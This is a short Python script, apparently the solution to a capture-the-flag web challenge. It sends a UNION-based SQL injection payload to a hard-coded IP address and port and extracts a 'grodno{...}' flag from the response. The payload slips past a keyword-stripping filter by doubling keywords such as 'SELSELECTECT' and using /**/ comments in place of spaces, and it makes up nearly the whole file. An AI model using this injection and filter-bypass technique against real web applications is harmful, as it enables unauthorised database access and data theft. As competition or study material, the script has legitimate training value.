import requests
import re

def main(url):

	flag_re = 'grodno{.*?}'

	req = requests.post(url)
	# print (req.text)
	flag = re.findall(flag_re, req.text)
	print(flag[0])

if __name__=='__main__':
	url="http://45.88.77.177:21003/?id=0' ununionion/**/SELSELECTECT/**/1,(SELSELECTECT/**/(flag)/**/FROFROMM/**/flag/**/LIMIT/**/1),3'"
	main(url)
